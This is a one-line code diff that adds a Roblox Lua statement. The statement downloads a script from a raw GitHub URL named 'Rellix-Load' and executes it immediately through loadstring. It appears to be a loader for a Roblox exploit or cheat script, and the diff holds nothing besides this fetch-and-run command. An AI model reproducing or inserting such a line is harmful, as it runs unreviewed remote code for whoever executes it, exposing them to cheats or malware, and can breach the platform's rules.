@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/l32W7/Rellix-Load/refs/heads/main/Rellix"))()
